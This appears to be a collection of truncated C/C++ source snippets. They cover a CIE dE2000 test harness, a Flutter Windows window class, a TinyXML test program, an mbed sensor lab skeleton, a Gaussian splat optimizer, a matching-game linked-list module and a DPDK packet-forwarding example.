1.024061208946461}\n};\n\n\nint main() {\n    const int numTests = sizeof(tests) / sizeof(tests[0]);\n    const double tolerance = 0.01;\n    \n    int numFailures = 0;\n    for (int i = 0; i < numTests; i++) {\n        const TestVector& test = tests[i];\n        double diff = deltaE_CIE2000(test.a, test.b);\n        if (std::abs(diff - test.dE) > tolerance) {\n            std::fprintf(stderr, \"Failed: %d, expected %f - got %f (delta: %f)\\n\", test.id, test.dE, diff, std::abs(diff - test.dE));\n            numFailures++;\n        }\n    }\n\n    if (numFailures == 0) {\n        std::fprintf(stderr, \"Passed\\n\");\n    }\n}\n\n/*\n Put your implementation of CIE dE2000 here...\n*/\n\n/*\nThe formula for CIE dE2000 was taken from:\nhttps://en.wikipedia.org/wiki/Color_dif",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/*\n   Test program for TinyXML.\n*/\n\n\n#include \"tinyxml.h\"\n\n#ifdef TIXML_USE_STL\n\t#include <iostream>\n\t#include <sstream>\n\tusing namespace std;\n#else\n\t#include <stdio.h>\n#endif\n\n#if defined( WIN32 ) && defined( TUNE )\n\t#include <windows.h>\n\t// Apologies to non-windows users! But I need some good timers for\n\t// profiling, and these are very platform specific.\n\t__int64 start;\n\t__int64 end;\n\t__int64 freq;\n#endif\n\nstatic int gPass = 0;\nstatic int gFail = 0;\n\n\nbool XmlTest (const char* testString, const char* expected, const char* found, bool noEcho = false)\n{\n\tbool pass = !strcmp( expected, found );\n\tif ( pass )\n\t\tprintf (\"[pass]\");\n\telse\n\t\tprintf (\"[fail]\");\n\n\tif ( noEcho )\n\t\tprintf (\" %s\\n\", testString);\n\telse\n\t\tprintf (\" %s [%s][%s]\\n\", testString, expected, found);\n\n\tif ( pass )\n\t\t++gPass;\n\telse\n\t\t++gFail;\n\treturn pass;\n}\n\n\nbool XmlTest( const char* testString, int expected, int found, bool noEcho = false )\n{\n\tbool pass = ( expected == found );\n\tif ( pass )\n\t\tprintf (\"[pass]\");\n\telse\n\t\tprintf (\"[fail]\");\n\n\tif ( noEcho )\n\t\tprintf (\" %s\\n\", testString);\n\telse\n\t\tprintf (\" %s [%d][%d]\\n\", testString, expected, found);\n\n\tif ( pass )\n\t\t++gPass;\n\telse\n\t\t++gFail;\n\treturn pass;\n}\n\n\n//\n// This file demonstrates some basic functionality of TinyXml.\n// Note that the example is very contrived. It presumes you know\n// what is in the XML file. But it does test the basic operations,\n// and show how to add and remove nodes.\n//\n\nint main()\n{\n\t//\n\t// We start with the 'demoStart' todo list. Process it. And\n\t// should hopefully end up with the todo list as illustrated.\n\t//\n\tconst char* demoStart =\n\t\t\"<?xml version=\\\"1.0\\\"  standalone='no' >\\n\"\n\t\t\"<!-- Our to do list data -->\"\n\t\t\"<ToDo>\\n\"\n\t\t\"<!-- Do I need a secure PDA? -->\\n\"\n\t\t\"<Item priority=\\\"1\\\" distance='close'> Go to the <bold>Toy store!</bold></Item>\"\n\t\t\"<Item priority=\\\"2\\\" distance='none'> Do bills   </Item>\"\n\t\t\"<Item priority=\\\"2\\\" distance='far &amp; back'> Look for Evil Dinosaurs! </Item>\"\n\t\t\"</ToDo>\";\n\n#ifdef TIXML_USE_STL\n\t/*\tWhat the todo list should look like after processing.\n\t\tIn stream (no formatting) representation. */\n\tconst char* demoEnd =\n\t\t\"<?xml version=\\\"1.0\\\" standalone=\\\"no\\\" ?>\"\n\t\t\"<!-- Our to do list data -->\"\n\t\t\"<ToDo>\"\n\t\t\"<!-- Do I need a secure PDA? -->\"\n\t\t\"<Item priority=\\\"2\\\" distance=\\\"close\\\">Go to the\"\n\t\t\"<bold>Toy store!\"\n\t\t\"</bold>\"\n\t\t\"</Item>\"\n\t\t\"<Item priority=\\\"1\\\" distance=\\\"far\\\">Talk to:\"\n\t\t\"<Meeting where=\\\"School\\\">\"\n\t\t\"<Attendee name=\\\"Marple\\\" position=\\\"teacher\\\" />\"\n\t\t\"<Attendee name=\\\"Voel\\\" position=\\\"counselor\\\" />\"\n\t\t\"</Meeting>\"\n\t\t\"<Meeting where=\\\"Lunch\\\" />\"\n\t\t\"</Item>\"\n\t\t\"<Item priority=\\\"2\\\" distance=\\\"here\\\">Do bills\"\n\t\t\"</Item>\"\n\t\t\"</ToDo>\";\n#endif\n\n\t// The example parses from the character string (above):\n\t#if defined( WIN32 ) && defined( TUNE )\n\tQueryPerformanceCounter( (LARGE_INTEGER*) (&start) );\n\t#endif\t\n\n\t{\n\t\t// Write to a file and read it back, to check file I/O.\n\n\t\tTiXmlDocument doc( \"demotest.xml\" );\n\t\tdoc.Parse( demoStart );\n\n\t\tif ( doc.Error() )\n\t\t{\n\t\t\tprintf( \"Error in %s: %s\\n\", doc.Value(), doc.ErrorDesc() );\n\t\t\texit( 1 );\n\t\t}\n\t\tdoc.SaveFile();\n\t}\n\n\tTiXmlDocument doc( \"demotest.xml\" );\n\tbool loadOkay = doc.LoadFile();\n\n\tif ( !loadOkay )\n\t{\n\t\tprintf( \"Could not load test file 'demotest.xml'. Error='%s'. Exiting.\\n\", doc.ErrorDesc() );\n\t\texit( 1 );\n\t}\n\n\tprintf( \"** Demo doc read from disk: ** \\n\\n\" );\n\tdoc.Print( stdout );\n\n\tTiXmlNode* node = 0;\n\tTiXmlElement* todoElement = 0;\n\tTiXmlElement* itemElement = 0;\n\n\n\t// --------------------------------------------------------\n\t// An example of changing existing attributes, and removing\n\t// an element from the document.\n\t// --------------------------------------------------------\n\n\t// Get the \"ToDo\" element.\n\t// It is a child of the document, and can be selected by name.\n\tnode = doc.FirstChild( \"ToDo\" );\n\tassert( node );\n\ttodoElement = node->ToElement();\n\tassert( todoElement  );\n\n\t// Going to the toy store is now our second priority...\n\t// So set the \"priority\" attribute of the first item in the list.\n\tnode = todoElement->FirstChildElement();\t// This skips the \"PDA\" comment.\n\tassert( node );\n\titemElement = node->ToElement();\n\tassert( itemElement  );\n\titemElement->SetAttribute( \"priority\", 2 );\n\n\t// Change the distance to \"doing bills\" from\n\t// \"none\" to \"here\". It's the next sibling element.\n\titemElement = itemElement->NextSiblingElement();\n\tassert( itemElement );\n\titemElement->SetAttribute( \"distance\", \"here\" );\n\n\t// Remove the \"Look for Evil Dinosaurs!\" item.\n\t// It is 1 more sibling away. We ask the parent to remove\n\t// a particular child.\n\titemElement = itemElement->NextSiblingElement();\n\ttodoElement->RemoveChild( itemElement );\n\n\titemElement = 0;\n\n\t// --------------------------------------------------------\n\t// What follows is an example of created elements and text\n\t// nodes and adding them to the document.\n\t// --------------------------------------------------------\n\n\t// Add some meetings.\n\tTiXmlElement item( \"Item\" );\n\titem.SetAttribute( \"priority\", \"1",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/*----------------------------------------------------------------------------\r\nLAB EXERCISE - Environmental sensors measurements\r\n ----------------------------------------\r\n\tIn this exercise we will read the environmental sensors on the Nucleo sensors shield (X-NUCLEO-IKS01A1)\r\n\twith the help of the ST Nucleo Sensor Shield library which is compatible with the MBED API.\r\n\tThen we will send the measurements via USB to our PC using serial communication.\r\n\tWe can then display the results using a terminal emulation program (e.g. Termite).\r\n\r\n\tAt the same time the program blinks the on board LED to show alivness.\r\n\r\n\r\n\tGOOD LUCK!\r\n *----------------------------------------------------------------------------*/\r\n\r\n\r\n#include \"mbed.h\"\r\n#include \"platform/mbed_thread.h\"\r\n#include \"XNucleoIKS01A3.h\"\r\n\r\n// Blinking rate in milliseconds\r\n#define BLINKING_RATE_MS                                                    1000\r\n\r\n// Create a DigitalOut objects for the LED\r\n\r\n// Create a Serial objects to communicate via USB\r\n\r\n// Create 2 Ticker objects for recurring interrupts. One for blink a LED and the other one to update the sensor lectures periodicly\r\n\r\n// Declare and define a measurement update flag\r\n\r\n// Handler for the aliveness LED; to be called every 0.5s\r\n\r\n// Handler for the measurements update; rise a flag every 3 seconds\r\n\r\n/* Create sensor shield object */\r\n\r\nint main()\r\n{\r\n    \r\n    /* Enable sensors */\r\n\r\n    /* Attach functions to be called by the Ticker objects at a specific interval in seconds */\r\n\r\n    while (true) {\r\n        /* Check for the measurements update flag */\r\n\r\n            /* Read the environmental sensors */\r\n\r\n            /* Calculate temperature in Fahrenheit and Kelvins */\r\n\r\n            /*Send data through serial communication */\r\n\r\n            /* Turn down the measurements update flag */\r\n\r\n        /*Wait for interrupts*/\r\n\r\n    }\r\n}\r\n",
    "\ufeff#include \"pr.hpp\"\n#include <iostream>\n#include <memory>\n\n#include <intrin.h>\n\n#define SPLAT_BOUNDS 3.0f\n#define MIN_THROUGHPUT ( 1.0f / 256.0f )\n\nuint32_t pcg(uint32_t v)\n{\n    uint32_t state = v * 747796405u + 2891336453u;\n    uint32_t word = ((state >> ((state >> 28u) + 4u)) ^ state) * 277803737u;\n    return (word >> 22u) ^ word;\n}\n\nglm::uvec3 pcg3d(glm::uvec3 v)\n{\n    v = v * 1664525u + 1013904223u;\n    v.x += v.y * v.z; v.y += v.z * v.x; v.z += v.x * v.y;\n    v ^= v >> 16u;\n    v.x += v.y * v.z; v.y += v.z * v.x; v.z += v.x * v.y;\n    return v;\n}\n\nglm::vec3 sign_of(glm::vec3 v)\n{\n    return {\n        v.x < 0.0f ? -1.0f : 1.0f,\n        v.y < 0.0f ? -1.0f : 1.0f,\n        v.z < 0.0f ? -1.0f : 1.0f\n    };\n}\nfloat sign_of(float v)\n{\n    return v < 0.0f ? -1.0f : 1.0f;\n}\ntemplate <class T>\ninline T ss_max( T x, T y )\n{\n\treturn ( x < y ) ? y : x;\n}\n\ntemplate <class T>\ninline T ss_min( T x, T y )\n{\n\treturn ( y < x ) ? y : x;\n}\nfloat exp_approx( float x )\n{\n\t//return expf( x ); // use this for numerical varidation\n\n\t/*\n\tfloat L = 0.0f;\n\tfloat R = 1.0f;\n\tfor (int i = 0 ; i < 1000 ; i++)\n\t{\n\t\tfloat m = ( L + R ) * 0.5f;\n\t\tfloat x = m;\n\t\tx *= x;\n\t\tx *= x;\n\t\tx *= x;\n\t\tif( x == 0.0f || fpclassify(x) == FP_SUBNORMAL )\n\t\t{\n\t\t\tL = m;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tR = m;\n\t\t}\n\t}\n\tprintf( \"%.32f\\n\", R ); >> 0.00001814586175896693021059036255\n\t*/\n\tx = 1.0f + x / 8.0f;\n\tif( x < 0.00001814586175896693021059036255f ) // avoid subnormal\n\t{\n\t\treturn 0.0f;\n\t}\n\tx *= x;\n\tx *= x;\n\tx *= x;\n\treturn x;\n}\n\nstruct Splat\n{\n    glm::vec2 pos;\n\tfloat sx;\n\tfloat sy;\n\tfloat rot;\n    glm::vec3 color;\n\tfloat opacity;\n};\n\n#define POS_PURB 0.1f\n#define RADIUS_PURB 0.1f\n#define COLOR_PURB 0.01f\n\n#define RADIUS_MAX 16.0f\n\nenum\n{\n    SIGNBIT_POS_X = 0,\n    SIGNBIT_POS_Y,\n    SIGNBIT_RADIUS,\n    SIGNBIT_COL_R,\n    SIGNBIT_COL_G,\n    SIGNBIT_COL_B,\n};\n\nbool bitAt(uint32_t u, uint32_t i)\n{\n    return u & (1u << i);\n}\n\n// 0: +1, 1: -1\nfloat signAt(uint32_t u, uint32_t i)\n{\n    return bitAt(u, i) ? -1.0f : 1.0f;\n}\n\nuint32_t splatRng(uint32_t i, uint32_t perturbIdx)\n{\n    return pcg(i + pcg(perturbIdx));\n}\n\nfloat lengthSquared(glm::vec2 v)\n{\n    return v.x * v.x + v.y * v.y;\n}\nfloat lengthSquared(glm::vec3 v)\n{\n    return v.x * v.x + v.y * v.y + v.z * v.z;\n}\n\nconst float ADAM_BETA1 = 0.9f;\nconst float ADAM_BETA2 = 0.99f;\n\nstruct Adam\n{\n    float m_m;\n    float m_v;\n\n    float optimize(float value, float g, float alpha, float beta1t, float beta2t)\n    {\n        float s = alpha;\n        float m = ADAM_BETA1 * m_m + (1.0f - ADAM_BETA1) * g;\n        float v = ADAM_BETA2 * m_v + (1.0f - ADAM_BETA2) * g * g;\n        m_m = m;\n        m_v = v;\n        float m_hat = m / (1.0f - beta1t);\n        float v_hat = v / (1.0f - beta2t);\n\n        const float ADAM_E = 1.0e-15f;\n        return value - s * m_hat / (sqrt(v_hat) + ADAM_E);\n    }\n};\nstruct SplatAdam\n{\n    Adam pos[2];\n\tAdam sx;\n\tAdam sy;\n\tAdam rot;\n    Adam color[3];\n\tAdam opacity;\n};\n\n\n\n// ax^2 + bx + c == 0\nint solve_quadratic( float xs[2], float a, float b, float c )\n{\n\tfloat det = b * b - 4.0f * a * c;\n\tif( det < 0.0f )\n\t{\n\t\treturn 0;\n\t}\n\n\tfloat k = ( -b - sign_of( b ) * std::sqrtf( det ) ) / 2.0f;\n\tfloat x0 = k / a;\n\tfloat x1 = c / k;\n\txs[0] = ss_min( x0, x1 );\n\txs[1] = ss_max( x0, x1 );\n\treturn 2;\n}\n\n// lambda0 is larger\nvoid eignValues( float* lambda0, float* lambda1, float* determinant, const glm::mat2& mat )\n{\n\tfloat mean = ( mat[0][0] + mat[1][1] ) * 0.5f;\n\tfloat det = mat[0][0] * mat[1][1] - mat[1][0] * mat[0][1];\n\tfloat d = std::sqrtf( ss_max( mean * mean - det, 0.0f ) );\n\t*lambda0 = mean + d;\n\t*lambda1 = mean - d;\n    *determinant = det;\n}\n\nglm::mat2 rot2d( float rad )\n{\n\tfloat cosTheta = std::cosf( rad );\n\tfloat sinTheta = std::sinf( rad );\n\treturn glm::mat2( cosTheta, sinTheta, -sinTheta, cosTheta );\n};\n\n// \\sigma = V * L * V^(-1)\nglm::mat2 cov_of( const Splat& splat )\n{\n\tfloat theta = splat.rot;\n\tfloat sx = splat.sx;\n\tfloat sy = splat.sy;\n\n\tfloat cosTheta = std::cosf( theta );\n\tfloat sinTheta = std::sinf( theta );\n\tfloat lambda0 = sx * sx;\n\tfloat lambda1 = sy * sy;\n\tfloat s11 = lambda0 * cosTheta * cosTheta + lambda1 * sinTheta * sinTheta;\n\tfloat s12 = ( lambda0 - lambda1 ) * sinTheta * cosTheta;\n\treturn glm::mat2(\n\t\ts11, s12,\n\t\ts12, lambda0 + lambda1 - s11 );\n}\n\nvoid eigen_vectors_of_cov( glm::vec2* eigen0, glm::vec2* eigen1, const glm::mat2& cov, float lambda0 /*larger*/ )\n{\n\tfloat s11 = cov[0][0];\n\tfloat s22 = cov[1][1];\n\tfloat s12 = cov[1][0];\n\n\tfloat eps = 1e-15f;\n\tglm::vec2 e0 = glm::normalize( s11 < s22 ? glm::vec2( s12 + eps, lambda0 - s11 ) : glm::vec2( lambda0 - s22, s12 + eps ) );\n\tglm::vec2 e1 = { -e0.y, e0.x };\n\t*eigen0 = e0;\n\t*eigen1 = e1;\n}\n\nint main() {\n    using namespace pr;\n\n    SetDataDir(ExecutableDir());\n\n    Config config;\n    config.ScreenWidth = 1920;\n    config.ScreenHeight = 1080;\n    config.SwapInterval = 0;\n    Initialize(config);\n\n    Camera3D camera;\n    camera.origin = { 0, 0, 200 };\n    camera.lookat = { 0, 0, 0 };\n\n    double e = GetElapsedTime();\n\n    ITexture* textureRef ",
    "\ufeff#include<iostream>\n#include<conio.h>\n#include\"Interface.h\"\n#include\"Controller.h\"\n#include\"Game.h\"\nusing namespace std;\n\n//Delete button \nvoid DeleteButton(Node** list, int row, int col)\n{\n\tfor (int i = 0; i < row; i++)\n\t{\n\t\tfor (int j = 0; j < col; j++)\n\t\t{\n\t\t\t//Get node with specific index row and col\n\t\t\tNode* pCurr = GetNode(list, i + 1, j + 1);\n\t\t\tif (pCurr->data.key == 0)\n\t\t\t{\n\t\t\t\tController::DeleteRectangleWithBackgroundColor(7 * j + 4, 5 * i + 1, 7, 5);\n\t\t\t\tInterface::GotoXY(7 * j + 7, 5 * i + 3);\n\t\t\t}\n\t\t}\n\t}\n}\n//Draw button again\nvoid DrawButtonAgain(Node** list, int row, int col)\n{\n\tfor (int i = 0; i < row; i++)\n\t{\n\t\tfor (int j = 0; j < col; j++)\n\t\t{\n\t\t\tNode* pCurr = GetNode(list, i + 1, j + 1);\n\t\t\tif (pCurr->data.key == 1)\n\t\t\t{\n\t\t\t\tController::PrintRectangle(7 * j + 4, 5 * i + 1, 7, 5);\n\t\t\t\tInterface::GotoXY(7 * j + 7, 5 * i + 3);\n\t\t\t\tcout << pCurr->data.c;\n\t\t\t}\n\t\t}\n\t}\n}\n//Create list with board data containing key, character, coordinate, index\nNode** CreateList(char**& c, int row, int col)\n{\n\tGame::AddCharToButton(c, row, col);\n\tNode** newNode = new Node * [row + 2];\n\tfor (int i = 0; i < row + 2; i++)\n\t{\n\t\tnewNode[i] = NULL;\n\t}\n\tfor (int i = 0; i <= row + 1; i++)\n\t{\n\t\tfor (int j = 0; j <= col + 1; j++)\n\t\t{\n\t\t\tBoard board;\n\t\t\tif (i == 0 || j == 0 || i == row + 1 || j == col + 1)\n\t\t\t{\n\t\t\t\tboard.c = ' ';\n\t\t\t\tboard.coordinate = { -1, -1 };\n\t\t\t\tboard.index = { -1, -1 };\n\t\t\t\tboard.key = 0;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tboard.c = c[i - 1][j - 1];\n\t\t\t\tboard.index = { i, j };\n\t\t\t\tboard.coordinate = { 7 * (j - 1) + 7, 5 * (i - 1) + 3 };\n\t\t\t\tboard.key = 1;\n\t\t\t}\n\t\t\t//Add tail of node\n\t\t\tAddTail(newNode[i], board);\n\t\t}\n\t}\n\treturn newNode;\n}\n//Create node\nNode* CreateNode(Board board)\n{\n\tNode* newNode = new Node;\n\tnewNode->data = board;\n\tnewNode->next = NULL;\n\treturn newNode;\n}\n//Add tail of node\nvoid AddTail(Node*& pHead, Board board)\n{\n\tNode* newNode = CreateNode(board);\n\tif (pHead == NULL)\n\t{\n\t\tpHead = newNode;\n\t\treturn;\n\t}\n\tNode* pCurr = pHead;\n\twhile (pCurr->next != NULL)\n\t{\n\t\tpCurr = pCurr->next;\n\t}\n\tpCurr->next = newNode;\n}\n//Update all of nodes after delete\nvoid UpdateNodeAfterDelete(Node**& list, pair<int, int>index1, pair<int, int>index2)\n{\n\t//If 2 button have the same row\n\tif (index1.first == index2.first)\n\t{\n\t\t//If the first button is next to the second button\n\t\tif (abs(index1.second - index2.second) == 1)\n\t\t{\n\t\t\t//Get node having min column of two buttons\n\t\t\tNode* pCurr = GetNode(list, index1.first, min(index1.second, index2.second));\n\t\t\t//Shift the data of the next next node\n\t\t\twhile (pCurr->next->next != NULL)\n\t\t\t{\n\t\t\t\t//Shift the data of the next next node to the current node\n\t\t\t\tpCurr->data.c = pCurr->next->next->data.c;\n\t\t\t\tpCurr->data.key = pCurr->next->next->data.key;\n\t\t\t\tpCurr = pCurr->next;\n\t\t\t}\n\t\t\t//The node lie down at last button\n\t\t\tpCurr->data.c = ' ';\n\t\t\tpCurr->data.key = 0;\n\t\t}\n\t\t//If the first button isn't next to the second button\n\t\telse\n\t\t{\n\t\t\t//Get first button\n\t\t\tNode* pCurr1 = GetNode(list, index1.first, min(index1.second, index2.second));\n\t\t\t//Get second button\n\t\t\tNode* pCurr2 = GetNode(list, index1.first, max(index1.second, index2.second));\n\t\t\twhile (pCurr1->next != pCurr2)\n\t\t\t{\n\t\t\t\t//Shift the data of the next node to the first node\n\t\t\t\tpCurr1->data.c = pCurr1->next->data.c;\n\t\t\t\tpCurr1->data.key = pCurr1->next->data.key;\n\t\t\t\tpCurr1 = pCurr1->next;\n\t\t\t}\n\t\t\t//Shift the data of the next of second node to the first node\n\t\t\twhile (pCurr2->next->next != NULL)\n\t\t\t{\n\t\t\t\tpCurr1->data.c = pCurr2->next->data.c;\n\t\t\t\tpCurr1->data.key = pCurr2->next->data.key;\n\t\t\t\tpCurr2 = pCurr2->next;\n\t\t\t\tpCurr1 = pCurr1->next;\n\t\t\t}\n\t\t\t//If the first node and second node is before the last and the last respectively\n\t\t\tpCurr1->data.c = ' ';\n\t\t\tpCurr1->data.key = 0;\n\t\t\tpCurr2->data.c = ' ';\n\t\t\tpCurr2->data.key = 0;\n\t\t}\n\t}\n\t//If the first button and second button isn't the same row\n\telse\n\t{\n\t\t//Get first button\n\t\tNode* pCurr1 = GetNode(list, index1.first, index1.second);\n\t\t//Get second button\n\t\tNode* pCurr2 = GetNode(list, index2.first, index2.second);\n\t\t//Shift the data of the next node of first node to the first node\n\t\twhile (pCurr1->next != NULL)\n\t\t{\n\t\t\tpCurr1->data.c = pCurr1->next->data.c;\n\t\t\tpCurr1->data.key = pCurr1->next->data.key;\n\t\t\tpCurr1 = pCurr1->next;\n\t\t}\n\t\t//Shift the data of the next node of second node to the second node\n\t\twhile (pCurr2->next != NULL)\n\t\t{\n\t\t\tpCurr2->data.c = pCurr2->next->data.c;\n\t\t\tpCurr2->data.key = pCurr2->next->data.key;\n\t\t\tpCurr2 = pCurr2->next;\n\t\t}\n\t}\n}\n//Get node\nNode* GetNode(Node** list, int indexRow, int indexCol)\n{\n\tNode* pCurr = list[indexRow];\n\t//Ch\u00fa \u00fd h\u00e0m GetNode;\n\tint cnt = 0;\n\twhile (cnt != indexCol)\n\t{\n\t\tpCurr = pCurr->next;\n\t\tcnt++;\n\t}\n\treturn pCurr;\n}\n//Update node by boardUpdate\nvoid UpdateNode(Node**& list, Board boardUpdate, int indexRow, int indexCol)\n{\n\tNode* pUpdate = list[indexRow];\n\tint cnt = 0;\n\twhile (cnt != indexCol)\n\t{\n\t\tpUpdate = pUpdate->next;\n\t\tcnt++;\n\t}\n\tpUpdate->data = boardUpdate;\n}\n//It is the same as Check I without linkedlist, just change ",
    "/* SPDX-License-Identifier: BSD-3-Clause\n * Copyright(c) 2010-2015 Intel Corporation\n */\n\n#include <stdint.h>\n#include <stdlib.h>\n#include <vector>\n#include <string>\n#include <inttypes.h>\n#include <rte_eal.h>\n#include <rte_ethdev.h>\n#include <rte_cycles.h>\n#include <rte_lcore.h>\n#include <rte_mbuf.h>\n\n#define RX_RING_SIZE 1024\n#define TX_RING_SIZE 1024\n\n#define NUM_MBUFS 8191\n#define MBUF_CACHE_SIZE 250\n#define BURST_SIZE 32\n\n/* basicfwd.c: Basic DPDK skeleton forwarding example. */\n\n/*\n * Initializes a given port using global settings and with the RX buffers\n * coming from the mbuf_pool passed as a parameter.\n */\n\n/* Main functional part of port initialization. 8< */\nstatic inline int\nport_init(uint16_t port, struct rte_mempool *mbuf_pool)\n{\n\tstruct rte_eth_conf port_conf;\n\tconst uint16_t rx_rings = 1, tx_rings = 1;\n\tuint16_t nb_rxd = RX_RING_SIZE;\n\tuint16_t nb_txd = TX_RING_SIZE;\n\tint retval;\n\tuint16_t q;\n\tstruct rte_eth_dev_info dev_info;\n\tstruct rte_eth_txconf txconf;\n\n\tif (!rte_eth_dev_is_valid_port(port))\n\t\treturn -1;\n\n\tmemset(&port_conf, 0, sizeof(struct rte_eth_conf));\n\n\tretval = rte_eth_dev_info_get(port, &dev_info);\n\tif (retval != 0) {\n\t\tprintf(\"Error during getting device (port %u) info: %s\\n\",\n\t\t\t\tport, strerror(-retval));\n\t\treturn retval;\n\t}\n\n\tif (dev_info.tx_offload_capa & RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE)\n\t\tport_conf.txmode.offloads |=\n\t\t\tRTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE;\n\n\t/* Configure the Ethernet device. */\n\tretval = rte_eth_dev_configure(port, rx_rings, tx_rings, &port_conf);\n\tif (retval != 0)\n\t\treturn retval;\n\n\tretval = rte_eth_dev_adjust_nb_rx_tx_desc(port, &nb_rxd, &nb_txd);\n\tif (retval != 0)\n\t\treturn retval;\n\n\t/* Allocate and set up 1 RX queue per Ethernet port. */\n\tfor (q = 0; q < rx_rings; q++) {\n\t\tretval = rte_eth_rx_queue_setup(port, q, nb_rxd,\n\t\t\t\trte_eth_dev_socket_id(port), NULL, mbuf_pool);\n\t\tif (retval < 0)\n\t\t\treturn retval;\n\t}\n\n\ttxconf = dev_info.default_txconf;\n\ttxconf.offloads = port_conf.txmode.offloads;\n\t/* Allocate and set up 1 TX queue per Ethernet port. */\n\tfor (q = 0; q < tx_rings; q++) {\n\t\tretval = rte_eth_tx_queue_setup(port, q, nb_txd,\n\t\t\t\trte_eth_dev_socket_id(port), &txconf);\n\t\tif (retval < 0)\n\t\t\treturn retval;\n\t}\n\n\t/* Starting Ethernet port. 8< */\n\tretval = rte_eth_dev_start(port);\n\t/* >8 End of starting of ethernet port. */\n\tif (retval < 0)\n\t\treturn retval;\n\n\t/* Display the port MAC address. */\n\tstruct rte_ether_addr addr;\n\tretval = rte_eth_macaddr_get(port, &addr);\n\tif (retval != 0)\n\t\treturn retval;\n\n\tprintf(\"Port %u MAC: %02\" PRIx8 \" %02\" PRIx8 \" %02\" PRIx8\n\t\t\t   \" %02\" PRIx8 \" %02\" PRIx8 \" %02\" PRIx8 \"\\n\",\n\t\t\tport, RTE_ETHER_ADDR_BYTES(&addr));\n\n\t/* Enable RX in promiscuous mode for the Ethernet device. */\n\tretval = rte_eth_promiscuous_enable(port);\n\t/* End of setting RX port in promiscuous mode. */\n\tif (retval != 0)\n\t\treturn retval;\n\n\treturn 0;\n}\n/* >8 End of main functional part of port initialization. */\n\n/*\n * The lcore main. This is the main thread that does the work, reading from\n * an input port and writing to an output port.\n */\n\n /* Basic forwarding application lcore. 8< */\nstatic __rte_noreturn void\nlcore_main(void)\n{\n\tuint16_t port;\n\n\t/*\n\t * Check that the port is on the same NUMA node as the polling thread\n\t * for best performance.\n\t */\n\tRTE_ETH_FOREACH_DEV(port)\n\t\tif (rte_eth_dev_socket_id(port) >= 0 &&\n\t\t\t\trte_eth_dev_socket_id(port) !=\n\t\t\t\t\t\t(int)rte_socket_id())\n\t\t\tprintf(\"WARNING, port %u is on remote NUMA node to \"\n\t\t\t\t\t\"polling thread.\\n\\tPerformance will \"\n\t\t\t\t\t\"not be optimal.\\n\", port);\n\n\tprintf(\"\\nCore %u forwarding packets. [Ctrl+C to quit]\\n\",\n\t\t\trte_lcore_id());\n\n\t/* Main work of application loop. 8< */\n\tfor (;;) {\n\t\t/*\n\t\t * Receive packets on a port and forward them on the paired\n\t\t * port. The mapping is 0 -> 1, 1 -> 0, 2 